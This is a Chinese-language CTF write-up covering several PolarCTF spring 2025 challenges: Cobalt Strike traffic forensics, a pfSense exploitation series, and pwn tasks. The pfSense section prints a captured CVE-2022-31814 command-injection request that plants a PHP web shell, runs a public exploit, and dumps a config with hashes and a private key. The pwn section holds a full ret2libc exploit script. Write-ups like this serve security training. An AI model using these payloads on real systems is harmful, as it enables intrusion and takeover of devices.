#### 【MISC】WinCS1

*【2025春季个人挑战赛】 1.受控机器木马的回连的ip地址和端口是？（flag{ip:端口}） 附件链接: https://pan.baidu.com/s/1fMHp1Rp0GazByyLNXZPN1A?pwd=ytjk 题目WinCS1~6共用一个附件 解压密码：111f56127c28eb148ec8d64e48c75484 ps：威胁检测与网络流量分析题目暂时放MISC模块*

找到异常流

![image-20250322191440406](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250322191440406.png)

检查IP及端口

拿到flag

flag{61.139.2.139:80}

法二：

在虚拟机中找到恶意程序

用沙箱

拿到回连ip及端口

![image-20250322201337368](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250322201337368.png)

#### 【MISC】WinCS2

*【2025春季个人挑战赛】 2.分析流量信息，攻击者尝试修改的jhon账户密码是什么？（flag{password}）*

对流量继续进行分析

流量名称为cs_rush.pcapng

怀疑就是考察cs流量分析

找到疑似CS特征流量

```c
17	4.030494406	61.139.2.145	61.139.2.139	HTTP	222	GET /4Mht HTTP/1.1 
```

用NetA分析CS流量

因为是CS流量

所以还需要找到一个密钥文件

在挂载电脑镜像时

和木马exe同目录下存在两张意义不明的明日香图片

010打开，翻到两图片的末尾

在010的分块涂色功能下有很明显的拼接痕迹

发现是一个压缩包文件被人为切断成了两份

将两份文件拼接好

拿到完整的新的压缩包

压缩包的内容解压后就是密钥文件

选择这个密钥文件用NetA进行CS流量分析

然后搜索关键词

jhon

找到

C net user jhon P@ssW0rd@123

则密码就是

P@ssW0rd@123

#### 【MISC】WinCS3

*【2025春季个人挑战赛】 3.分析流量当中，攻击者查看的文件中flag内容是什么？*

仍然是NetA分析

关键字搜索flag

拿到

flag{31975589df49e6ce84853be7582549f4}

#### 【MISC】WinCS4

*【2025年春季个人挑战赛】 4.攻击者在攻击过程当中修改过的注册表目录是什么？（结果进行MD5加密）*

仍然是关键字搜索

reg

C reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command

对后面部分进行md5加密即可

HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command

--->md5

#### 【MISC】WinCS5

*【2025年春季个人挑战赛】 5.受控机当中加密文件的内容是什么？*

加密文件实为和木马文件同一目录下的压缩包

在flag关键词搜索的旁边

有一个很让人在意的地方

[+] 包序号【2481】解密结果：flag{31975589df49e6ce84853be7582549f4} passkey is PolarCTF@2025Spring

passkey

猜测后面的内容就是压缩包密码

解密，拿到压缩包内容

flag{fc51bd0633d256f2dcbe282efa205c3a}

#### 【MISC】WinCS6

*【2025年春季个人挑战赛】 6.受控机木马的自启动文件路径是什么？（结果进行MD5加密）*

在挂载机上找

用挂载机的计算机管理栏进行查找

最终找到一个可疑项

![image-20250323132712581](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250323132712581.png)

跟进这个目录

对这个文件通过编辑的方式进行查看内容

![image-20250323132836369](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250323132836369.png)

发现启动的进程就是木马文件

将这个文件的路径通过md5加密即可

#### 【MISC】find

是个xlsx文件

部分表格存在加粗

部分没有

用替换功能

用黑色标出加粗位置

然后修改宽高使得图像直观

拿到最终效果

![image-20250323135111688](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250323135111688.png)

拿去扫描拿到flag

flag{11be65d59abc1b45ad8b9cc1e695a016}

#### 【MISC】pfsense1

*【2025春季个人挑战赛】 1、从流量数据包中找出攻击者利用漏洞开展攻击的会话，写出其中攻击者执行的命令中设置的flag内容 附件链接:https://pan.baidu.com/s/1qsADXodtAmARGV7kdRuPSQ?pwd=ngt7 题目pfsense1~3共用一个附件 解压密码：e6a06e373c007c352d53be51a82e4874 ps：威胁检测与网络流量分析题目暂时放在MISC模块*

NetA速秒

```C
[+] TCP数据流检测到文件，已保存至：output/2025-03-24-121912\1742789961.1554654.gif



[+] TCP流【1】数据：GET //pfblockerng/www/index.php HTTP/1.1 

User-Agent: python-requests/2.28.1 

Accept-Encoding: gzip, deflate 

Accept: */* 

Connection: keep-alive 

Host: ' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+ZmxhZ3tjOTMwYTIwNzI5Y2Q3MTBjOWFjMmUxYmNkMzY4NTZlNX0='|python3.8 -m base64 -d | php; '
```

对底下部分解码

拿到

<?$a=fopen("/usr/local/www/system_advanced_control.php","w") or die();$t='<?php print(passthru( $_GET["c"]));?>';fwrite($a,$t);fclose( $a);?>flag{c930a20729cd710c9ac2e1bcd36856e5}

#### 【MISC】pfsense2

*【2025春季个人挑战赛】 2、攻击者通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，写出flag的文件内容*

按照题目要求开环境

然后环境让登录

没账密没办法

现在看到刚刚拿到的flag前面的内容

搜索

找到一个相关的CVE

[CVE-2022-31814pfsense远程命令执行漏洞复现与exp利用-CSDN博客](https://blog.csdn.net/zwy15288408160/article/details/130622828)

利用对应的exp

打通

```c
Windows PowerShell
版权所有（C） Microsoft Corporation。保留所有权利。

安装最新的 PowerShell，了解新功能和改进！https://aka.ms/PSWindows

(.venv) PS D:\python\pythonProject> python 54.py --url http://61.139.2.139/
[+] pfBlockerNG is installed
[/] Uploading shell...
[+] Upload succeeded


```

使用命令

```linux
find / -name flag*
```

```C
# find / -name flag*

/usr/libexec/bsdconfig/110.mouse/flags
/home/ctfer/flag.txt
```

```C
cat /home/ctfer/flag.txt
```

拿到flag

flag{1b030dacb6e82a5cca0b1e6d2c8779fa}

#### 【MISC】pfsense3

*【2025春季个人挑战赛】 3、找出并提交受控机设备中普通用户的IPsec预共享密钥*

网上搜索IPsec是啥

然后对应pfsense

找到

*在 pfSense 中，IPsec 预共享密钥相关信息存储在配置文件中，该配置文件通常是`/conf/config.xml` 。*

指令：

```C
cat /conf/config.xml
```

```c
# cat /conf/config.xml

<?xml version="1.0"?>
<pfsense>
        <version>22.2</version>
        <lastchange></lastchange>
        <system>
                <optimization>normal</optimization>
                <hostname>pfSense</hostname>
                <domain>pfsenseCTF.com</domain>
                <group>
                        <name>all</name>
                        <description><![CDATA[All Users]]></description>
                        <scope>system</scope>
                        <gid>1998</gid>
                </group>
                <group>
                        <name>admins</name>
                        <description><![CDATA[System Administrators]]></description>
                        <scope>system</scope>
                        <gid>1999</gid>
                        <priv>page-all</priv>
                </group>
                <user>
                        <name>admin</name>
                        <descr><![CDATA[System Administrator]]></descr>
                        <scope>system</scope>
                        <groupname>admins</groupname>
                        <sha512-hash>$6$cbf23094c6e25075$NDSKnw8Ph8E1Z.Myh5985qzxSzE6XQ1u5E0cxn34yNAOhimReg0Ws2ZjLgSa.gcWlqrO1HVW.p8.ksD4idQ6r1</sha512-hash>
                        <uid>0</uid>
                        <priv>user-shell-access</priv>
                        <expires></expires>
                        <dashboardcolumns>2</dashboardcolumns>
                        <authorizedkeys>ZmFpcnlmdXJyeQ==</authorizedkeys>
                        <ipsecpsk></ipsecpsk>
                        <webguicss>pfSense.css</webguicss>
                </user>
                <user>
                        <scope>user</scope>
                        <sha512-hash>$6$6dc614aef87c6695$ovy9kvhlR45TwQ7D2.tF91hugHlYEafEzGsPT7FdKcbjA1cdNvSJbzYXuFsiV1PWM4hWKLk/i4Y4.sFWdw3/L0</sha512-hash>
                        <descr></descr>
                        <name>ctfer</name>
                        <expires></expires>
                        <dashboardcolumns>2</dashboardcolumns>
                        <authorizedkeys></authorizedkeys>
                        <ipsecpsk>flag{bde4b5e2d0c43c177895f6f5d85beb97}</ipsecpsk>
                        <webguicss>pfSense.css</webguicss>
                        <uid>2000</uid>
                </user>
                <nextuid>2001</nextuid>
                <nextgid>2000</nextgid>
                <timeservers>ntp1.aliyun.com</timeservers>
                <webgui>
                        <protocol>http</protocol>
                        <loginautocomplete></loginautocomplete>
                        <ssl-certref>67ad2dcbd6a1f</ssl-certref>
                        <dashboardcolumns>2</dashboardcolumns>
                        <webguicss>pfSense.css</webguicss>
                        <logincss>1e3f75;</logincss>
                        <port></port>
                        <max_procs>2</max_procs>
                </webgui>
                <disablenatreflection>yes</disablenatreflection>
                <disablesegmentationoffloading></disablesegmentationoffloading>
                <disablelargereceiveoffloading></disablelargereceiveoffloading>
                <ipv6allow></ipv6allow>
                <maximumtableentries>400000</maximumtableentries>
                <powerd_ac_mode>hadp</powerd_ac_mode>
                <powerd_battery_mode>hadp</powerd_battery_mode>
                <powerd_normal_mode>hadp</powerd_normal_mode>
                <bogons>
                        <interval>monthly</interval>
                </bogons>
                <hn_altq_enable></hn_altq_enable>
                <ssh>
                        <enable>enabled</enable>
                </ssh>
                <timezone>Asia/Shanghai</timezone>
                <language>zh_Hans_CN</language>
                <pkg_repo_conf_path>/usr/local/share/pfSense/pkg/repos/pfSense-repo-previous.conf</pkg_repo_conf_path>
                <dnsserver>8.8.8.8</dnsserver>
                <dnsallowoverride></dnsallowoverride>
                <disableconsolemenu></disableconsolemenu>
                <serialspeed>115200</serialspeed>
                <primaryconsole>serial</primaryconsole>
                <sshguard_threshold></sshguard_threshold>
                <sshguard_blocktime></sshguard_blocktime>
                <sshguard_detection_time></sshguard_detection_time>
                <sshguard_whitelist></sshguard_whitelist>
        </system>
        <interfaces>
                <wan>
                        <enable></enable>
                        <if>vmx0</if>
                        <ipaddr>dhcp</ipaddr>
                        <ipaddrv6>dhcp6</ipaddrv6>
                        <gateway></gateway>
                        <blockpriv>on</blockpriv>
                        <blockbogons>on</blockbogons>
                        <media></media>
                        <mediaopt></mediaopt>
                        <dhcp6-duid></dhcp6-duid>
                        <dhcp6-ia-pd-len>0</dhcp6-ia-pd-len>
                </wan>
                <lan>
                        <enable></enable>
                        <if>vmx1</if>
                        <ipaddr>61.139.2.139</ipaddr>
                        <subnet>24</subnet>
                        <ipaddrv6></ipaddrv6>
                        <subnetv6></subnetv6>
                        <media></media>
                        <mediaopt></mediaopt>
                        <track6-interface>wan</track6-interface>
                        <track6-prefix-id>0</track6-prefix-id>
                        <gateway></gateway>
                        <gatewayv6></gatewayv6>
                </lan>
        </interfaces>
        <staticroutes></staticroutes>
        <dhcpd>
                <lan>
                        <enable></enable>
                        <range>
                                <from>61.139.2.10</from>
                                <to>61.139.2.130</to>
                        </range>
                </lan>
        </dhcpd>
        <dhcpdv6>
                <lan>
                        <range>
                                <from>::1000</from>
                                <to>::2000</to>
                        </range>
                        <ramode>disabled</ramode>
                        <rapriority>medium</rapriority>
                </lan>
        </dhcpdv6>
        <snmpd>
                <syslocation></syslocation>
                <syscontact></syscontact>
                <rocommunity>public</rocommunity>
        </snmpd>
        <diag>
                <ipv6nat>
                        <ipaddr></ipaddr>
                </ipv6nat>
        </diag>
        <syslog>
                <filterdescriptions>1</filterdescriptions>
        </syslog>
        <nat>
                <outbound>
                        <mode>automatic</mode>
                </outbound>
        </nat>
        <filter>
                <rule>
                        <type>pass</type>
                        <ipprotocol>inet</ipprotocol>
                        <descr><![CDATA[Default allow LAN to any rule]]></descr>
                        <interface>lan</interface>
                        <tracker>0100000101</tracker>
                        <source>
                                <network>lan</network>
                        </source>
                        <destination>
                                <any></any>
                        </destination>
                </rule>
                <rule>
                        <type>pass</type>
                        <ipprotocol>inet6</ipprotocol>
                        <descr><![CDATA[Default allow LAN IPv6 to any rule]]></descr>
                        <interface>lan</interface>
                        <tracker>0100000102</tracker>
                        <source>
                                <network>lan</network>
                        </source>
                        <destination>
                                <any></any>
                        </destination>
                </rule>
        </filter>
        <shaper></shaper>
        <ipsec>
                <client></client>
        </ipsec>
        <aliases>
        </aliases>
        <proxyarp></proxyarp>
        <cron>
                <item>
                        <minute>*/1</minute>
                        <hour>*</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/sbin/newsyslog</command>
                </item>
                <item>
                        <minute>1</minute>
                        <hour>3</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/etc/rc.periodic daily</command>
                </item>
                <item>
                        <minute>15</minute>
                        <hour>4</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>6</wday>
                        <who>root</who>
                        <command>/etc/rc.periodic weekly</command>
                </item>
                <item>
                        <minute>30</minute>
                        <hour>5</hour>
                        <mday>1</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/etc/rc.periodic monthly</command>
                </item>
                <item>
                        <minute>1,31</minute>
                        <hour>0-5</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/bin/nice -n20 adjkerntz -a</command>
                </item>
                <item>
                        <minute>1</minute>
                        <hour>3</hour>
                        <mday>1</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/bin/nice -n20 /etc/rc.update_bogons.sh</command>
                </item>
                <item>
                        <minute>1</minute>
                        <hour>1</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/bin/nice -n20 /etc/rc.dyndns.update</command>
                </item>
                <item>
                        <minute>*/60</minute>
                        <hour>*</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/bin/nice -n20 /usr/local/sbin/expiretable -v -t 3600 virusprot</command>
                </item>
                <item>
                        <minute>30</minute>
                        <hour>12</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/bin/nice -n20 /etc/rc.update_urltables</command>
                </item>
                <item>
                        <minute>1</minute>
                        <hour>0</hour>
                        <mday>*</mday>
                        <month>*</month>
                        <wday>*</wday>
                        <who>root</who>
                        <command>/usr/bin/nice -n20 /etc/rc.update_pkg_metadata</command>
                </item>
        </cron>
        <wol></wol>
        <rrd>
                <enable></enable>
        </rrd>
        <widgets>
                <sequence>system_information:col1:show,disks:col1:show,netgate_services_and_support:col2:show,interfaces:col2:show,pfblockerng:col2:open:0</sequence>
                <period>10</period>
        </widgets>
        <openvpn></openvpn>
        <dnshaper></dnshaper>
        <unbound>
                <enable></enable>
                <dnssec></dnssec>
                <active_interface></active_interface>
                <outgoing_interface></outgoing_interface>
                <custom_options></custom_options>
                <hideidentity></hideidentity>
                <hideversion></hideversion>
                <dnssecstripped></dnssecstripped>
        </unbound>
        <vlans></vlans>
        <qinqs></qinqs>
        <revision>
                <time>1742789993</time>
                <description><![CDATA[(system): pfBlockerNG: saving Aliases]]></description>
                <username><![CDATA[(system)]]></username>
        </revision>
        <gateways></gateways>
        <dnsmasq></dnsmasq>
        <ntpd>
                <enable>enabled</enable>
                <orphan></orphan>
                <ntpminpoll></ntpminpoll>
                <ntpmaxpoll></ntpmaxpoll>
                <dnsresolv>auto</dnsresolv>
        </ntpd>
        <cert>
                <refid>67ad2dcbd6a1f</refid>
                <descr><![CDATA[webConfigurator default (67ad2dcbd6a1f)]]></descr>
                <type>server</type>
                <crt>LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVsRENDQTN5Z0F3SUJBZ0lJQTJUczh5cFZwREl3RFFZSktvWklodmNOQVFFTEJRQXdXakU0TURZR0ExVUUKQ2hNdmNHWlRaVzV6WlNCM1pXSkRiMjVtYVd
kMWNtRjBiM0lnVTJWc1ppMVRhV2R1WldRZ1EyVnlkR2xtYVdOaApkR1V4SGpBY0JnTlZCQU1URlhCbVUyVnVjMlV0TmpkaFpESmtZMkprTm1FeFpqQWVGdzB5TlRBeU1USXlNekkxCk1EQmFGdzB5TmpBek1UY3lNekkxTURCYU1Gb3hPREE
yQmdOVkJBb1RMM0JtVTJWdWMyVWdkMlZpUTI5dVptbG4KZFhKaGRHOXlJRk5sYkdZdFUybG5ibVZrSUVObGNuUnBabWxqWVhSbE1SNHdIQVlEVlFRREV4VndabE5sYm5ObApMVFkzWVdReVpHTmlaRFpoTVdZd2dnRWlNQTBHQ1NxR1NJYjN
EUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUM2Ci9XZlNXSlhHMW5QZHhIMUlXa25oQW82a3hpeGJoU1dYUWx5Ly9KbENGYWRnMUpjMXZBdUpkQXZuU0JsdEdNRisKREdnNENHK2lTNUhhQ2VsOGcybzhoU01EUXFhNW9oUjhoaVh1Z1RvRVd
5c0ZUbUcwVi9HbmZGZTBiUVZVZXVCUwpINTdralJpOVN0bWdQWjN6NHJIdzBPTDVRSXJ2dE5BVldCNXk1bWV4RmJIMUlQMlFaQ0l5dWdJTkJxTmRsNlZYCmxpQ3pNM1NITDJXWXdlcjRBTjAwRHVoVlA3aUdNVXlDdWpYOStvOXlvdTQvYU1
mNXd5OE1ER1FKd0JIRnlsOU8KS1dIS1RQeldTZDhIRUc2Z0NRWE5BRjZiTCt1M2IxUFNNeTlDWDNlWVoybENvbHZ5U0xCcHFidHUvbElETGpFaQpFVW43RlBYNUczYzhHUmUzNVlpdkFnTUJBQUdqZ2dGY01JSUJXREFKQmdOVkhSTUVBakF
BTUJFR0NXQ0dTQUdHCitFSUJBUVFFQXdJR1FEQUxCZ05WSFE4RUJBTUNCYUF3TXdZSllJWklBWWI0UWdFTkJDWVdKRTl3Wlc1VFUwd2cKUjJWdVpYSmhkR1ZrSUZObGNuWmxjaUJEWlhKMGFXWnBZMkYwWlRBZEJnTlZIUTRFRmdRVVB6ZDQ
5SXdiLzRpaApMaWFST2tWK0NGbnNYNXN3Z1lzR0ExVWRJd1NCZ3pDQmdJQVVQemQ0OUl3Yi80aWhMaWFST2tWK0NGbnNYNXVoClhxUmNNRm94T0RBMkJnTlZCQW9UTDNCbVUyVnVjMlVnZDJWaVEyOXVabWxuZFhKaGRHOXlJRk5sYkdZdFU
ybG4KYm1Wa0lFTmxjblJwWm1sallYUmxNUjR3SEFZRFZRUURFeFZ3WmxObGJuTmxMVFkzWVdReVpHTmlaRFpoTVdhQwpDQU5rN1BNcVZhUXlNQ2NHQTFVZEpRUWdNQjRHQ0NzR0FRVUZCd01CQmdnckJnRUZCUWNEQWdZSUt3WUJCUVVJCkF
nSXdJQVlEVlIwUkJCa3dGNElWY0daVFpXNXpaUzAyTjJGa01tUmpZbVEyWVRGbU1BMEdDU3FHU0liM0RRRUIKQ3dVQUE0SUJBUUFPbTZCcGtwdG5CL0I5UlRuZmFnbDdWVFZQNGl1bStxeVFvSGdmb1RyM3ZyYXpSSkdvU1lHWQpMa2lYNEh
ZTHZ4Vzl5MjQ1NDNXU0sxREJHMCtIMUU0ZjV4SW9qb051bU5TQnhiNWE1TEY2djcvb0ltclZXYlU4CldtTmRxMXFlSi94ZWRoYzJSNDBtWkJXZEVDLzNzVDdEckQxVnpqRERmK2hRSkE1UWNDZ0hEaVpaK3BOVzh5VjMKcC9MMG41WHRYMXJ
KbGNGeTNsUmVVc1ZZYlh3alVGTGtjcXRxcGFaSDdJM2JEUVBvVWcvK2N1blJCSmNKR3dvbgpZVVRDN21YT25GOGRmeS9wQ0w1SnJTSTJ4WnNKRTJPYmw3YThNVDZ4MmZJWWtyN3dsSXJzcUNpUU5JM3FQNXUwClFJY0E2QmhydEF5dG1LNi9CQXZiNmJoTEcySGNoaHlSCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K</crt>
                <prv>LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2Z0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktnd2dnU2tBZ0VBQW9JQkFRQzYvV2ZTV0pYRzFuUGQKeEgxSVdrbmhBbzZreGl4YmhTV1hRbHkvL0p
sQ0ZhZGcxSmMxdkF1SmRBdm5TQmx0R01GK0RHZzRDRytpUzVIYQpDZWw4ZzJvOGhTTURRcWE1b2hSOGhpWHVnVG9FV3lzRlRtRzBWL0duZkZlMGJRVlVldUJTSDU3a2pSaTlTdG1nClBaM3o0ckh3ME9MNVFJcnZ0TkFWV0I1eTVtZXhGYkg
xSVAyUVpDSXl1Z0lOQnFOZGw2VlhsaUN6TTNTSEwyV1kKd2VyNEFOMDBEdWhWUDdpR01VeUN1alg5K285eW91NC9hTWY1d3k4TURHUUp3QkhGeWw5T0tXSEtUUHpXU2Q4SApFRzZnQ1FYTkFGNmJMK3UzYjFQU015OUNYM2VZWjJsQ29sdnl
TTEJwcWJ0dS9sSURMakVpRVVuN0ZQWDVHM2M4CkdSZTM1WWl2QWdNQkFBRUNnZ0VCQUp1bENJRlBHVVRNQnQvbWlQM3JvYWs0cnJFNi8zc2loaHEwczIxZS9kYkQKSFhKOUltd28zVldKa2NydStiTVVzeUtQZzBSNHlTdEhTZDA2K08yYW1
aaE1uY3M5OUhkNkVTRmhyRHN0dDdRZQppdDI4MDVrQXh2WkppdHQxRDhXMURmbHR0cDI1VUlsbnYyUWhSZFBXczVTbTJ2YnNJWG5MZ0pUenAweXV1a3JzClBGUGtDQzZQTGhOSUZNbk5zL1R5LzdJZ0R5bUd4NS9YQTVwT1RCWm5lNHlHZTU
0bWpMR0hrV0lxYnU1Ymt2YmoKemNOcWpJSGVySUpydkw2K3ZibW5TVjBDalFUdk4vZ29FU1IxTzBtS3FlQ1pnbWV2QUR3UDUyREhrbFV0NUpVZgp0eGh5Mm5Dd3czOFk5U2VycVJPT0NOaVRhemJFaXdmeFAwU1FqRHhwNi9FQ2dZRUE5aVJ
UT0x6c0tnWmMrdEFUClpRU0ZhN2ZxU2lTNHRKa0FYcGJCTGtOV2p2Z09Hb2sveDdKUUk5YXNUS2IyNHpab3R2U29uQjhzY3pMbG53amMKeXVOR3RUVjZGSVFrNG5vNGZYaHNYemxrZzZma0pETWd3WmFGWFgxdXNoZUVYeU16eFNhbjVPRWl
KTHJ3Y1J6NApnYmRISWd3OG9CTm9wZVVKdUNRWWtpK2FFNWtDZ1lFQXducVpXV3d0V3M5dUZpTnhNM0JORU5lYlJwS0JtSXk3Cnlacmd1YTRqdHZiK21pNk83LzhrU1RDczRhdzVrR1VpMk9GTS9Fb3dVeElGNC85ZGN0RkhBNDRSVFhrN2l
vMy8KN1V4eEVadVBPcC9scEEwWWY4RU9sb0VsNnJNb3BwcTNDM0RHR2t6K0w2cG5lN2JtdGVtSSsrcXlpdnpReUN6NgpTbU5UODcrK3E0Y0NnWUVBdTlWa25MdXZEVExsNlpDMy9ETEREankvVWUxTDlxVjduck0wb0hWS3JMZW5LNkRwClJ
4OVFBTWxsbXVrZkpxenlwQXQ0VUF1S0JDOG5BNEhqM0FBc2lVUlI4UzRXWjY0VlJjcU1DTzduUVlEeG5KNVgKdE9PRXlwOVp4aFlrTWVYUEwvZ2J6NUh1V0ZGQUExRzBZbWpXbzZqcTZzMWs0cFF5SW8rSklLV3EwcUVDZ1lBNwpPWWExdXN
IZEk4cE1wNkp6bmNGNlhZNkY0VnZpRHdtcERhZGVKRy92Nml3QzNDYmZZMzJ6WkVWaHZFY1RlQmt5Cm52b0k0cmJ3dFU1aDdvU1EwTGFsbUlBZ2JjajZHdUJUYmJJSlFLeFBtQjRnNVhRT2c4WmpneFQrOG14d3dERDYKSk8vUFZwOForUFR
tc2Y1MGE1Z3h6M2xyNWkzV3FBdlkxNExiZWdzZ3hRS0JnQlJUZmllNHdQQmhYM2o0MzRFdQpDeGJITFpzaEhBSXdGZDNqRWY1cDNreW9DWjJDcHlQazMvY2JXVkE4cXJwMVVTMnovakZRcWllT2xvbWN0M0JwCmRMUG5TRUR4Rm1WYWt4Q1c2UVIxTG9XT3dtTUVtaytSSWc4aDJBK0tmVUJENjVLM21TdUxIai8xR3ZzOCt0TCsKZzRXcVZ5WFpERDJWZTJIcXVBODUva2JqCi0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K</prv>
        </cert>
        <ppps></ppps>
        <installedpackages>
                <package>
                        <name>pfBlockerNG</name>
                        <descr><![CDATA[Manage IPv4/v6 List Sources into 'Deny, Permit or Match' formats.&lt;br /&gt;
                        GeoIP database by MaxMind Inc. (GeoLite2 Free version).&lt;br /&gt;
                        De-Duplication, Suppression, and Reputation enhancements.&lt;br /&gt;
                        Provision to download from diverse List formats.&lt;br /&gt;
                        Advanced Integration for Proofpoint ET IQRisk IP Reputation Threat Sources.&lt;br /&gt;
                        Domain Name (DNSBL) blocking via Unbound DNS Resolver.]]></descr>
                        <pkginfolink>https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html</pkginfolink>
                        <version>3.2.0_4</version>
                        <configurationfile>pfblockerng.xml</configurationfile>
                        <include_file>/usr/local/pkg/pfblockerng/pfblockerng.inc</include_file>
                </package>
                <pfblockerng>
                        <config></config>
                </pfblockerng>
                <pfblockerngipsettings>
                        <config></config>
                </pfblockerngipsettings>
                <pfblockerngdnsblsettings></pfblockerngdnsblsettings>
                <pfblockerngblacklist></pfblockerngblacklist>
                <pfblockerngglobal></pfblockerngglobal>
                <pfblockerngsafesearch></pfblockerngsafesearch>

                <menu>
                        <name>pfBlockerNG</name>
                        <section>Firewall</section>
                        <url>/pfblockerng/pfblockerng_general.php</url>
                </menu>

​                <service>
​                        <name>pfb_dnsbl</name>
​                        <rcfile>pfb_dnsbl.sh</rcfile>
​                        <executable>lighttpd_pfb</executable>
​                        <description><![CDATA[pfBlockerNG DNSBL service]]></description>
​                </service>
​                <service>
​                        <name>pfb_filter</name>
​                        <rcfile>pfb_filter.sh</rcfile>
​                        <executable>php_pfb</executable>
​                        <description><![CDATA[pfBlockerNG firewall filter service]]></description>
​                </service>
​        </installedpackages>
​        <virtualip></virtualip>
</pfsense>
```

里面存在很明显的flag字样

flag即是答案

#### 【MISC】可老师签到

下载附件，是个视觉小说类型的游戏样式的附件

结果是公众号签到

输入flagflag拿到flag

![image-20250322191925563](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250322191925563.png)

#### 【PWN】libc

板子题，填板子

```python
from pwn import *
from LibcSearcher import *

io = remote('1.95.36.136', 2137)
# io = process("./pwn")
elf = ELF('./polar_pwn1')
# libc= ELF(elf.libc.path)

main_add = 0x08048591
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset = 0x3A

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendafter(b'like', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)  # libc6-i386_2.27-3ubuntu1_amd64

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0) + p32(bin_sh_add)

io.sendafter(b'like', payload2)

io.interactive()
```

#### 【PWN】koi

64位

main函数分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+5Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  v4 = 0;
  printf("choose your challenge\n:");
  puts("1.write shell");
  puts("2.use shell");
  puts("3.exif");
  __isoc99_scanf("%d", &v4);
  switch ( v4 )
  {
    case 1:
      wrshell();
      break;
    case 2:
      usshell();
      break;
    case 3:
      exif();
      break;
  }
  puts("Enter a:");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 520 && n == 520 )
  {
    puts("GOOD");
    xxx();
  }
  else
  {
    puts("Bless you");
  }
  return 0;
}
```

这里要先进行选择

先进入到wrshell函数看看

```c
int wrshell()
{
  int v1; // [rsp+8h] [rbp-58h] BYREF
  int v2; // [rsp+Ch] [rbp-54h] BYREF
  _BYTE buf[80]; // [rsp+10h] [rbp-50h] BYREF

  v2 = 0;
  v1 = 0;
  puts("Enter number:");
  __isoc99_scanf("%d", &v1);
  printf("size:");
  __isoc99_scanf("%d", &v2);
  puts("Enter sehll:");
  read(0, buf, 0x58uLL);
  return puts("success");
}
```

wrshell函数这里存在一个很明显的栈溢出

但是这里buf到栈底的位置又到不了read

一个0x50一个0x58，不够的

再依次继续看其他选项对应的函数

发现都没什么问题

继续分析main函数

  if ( v4 == 520 && n == 520 )

这个判断语句判断为真时，会进入到xxx函数

跟进xxx函数

```c
ssize_t xxx()
{
  _BYTE buf[80]; // [rsp+0h] [rbp-50h] BYREF

  puts("Welcome to Polar CTF!\n");
  return read(0, buf, 0x150uLL);
}
```

这里同样存在一个很明显的栈溢出

```c
.text:00000000004007DA var_4           = dword ptr -4
.text:00000000004007DA
.text:00000000004007DA ; __unwind {
.text:00000000004007DA                 push    rbp
.text:00000000004007DB                 mov     rbp, rsp
.text:00000000004007DE                 sub     rsp, 60h
.text:00000000004007E2                 mov     eax, 0
.text:00000000004007E7                 call    init
.text:00000000004007EC                 mov     [rbp+var_4], 0
.text:00000000004007F3                 mov     edi, offset format ; "choose your challenge\n:"
.text:00000000004007F8                 mov     eax, 0
.text:00000000004007FD                 call    _printf
.text:0000000000400802                 mov     edi, offset s   ; "1.write shell"
.text:0000000000400807                 call    _puts
.text:000000000040080C                 mov     edi, offset a2UseShell ; "2.use shell"
.text:0000000000400811                 call    _puts
.text:0000000000400816                 mov     edi, offset a3Exif ; "3.exif"
.text:000000000040081B                 call    _puts
.text:0000000000400820                 lea     rax, [rbp+var_4]
.text:0000000000400824                 mov     rsi, rax
.text:0000000000400827                 mov     edi, offset aD  ; "%d"
.text:000000000040082C                 mov     eax, 0
.text:0000000000400831                 call    ___isoc99_scanf
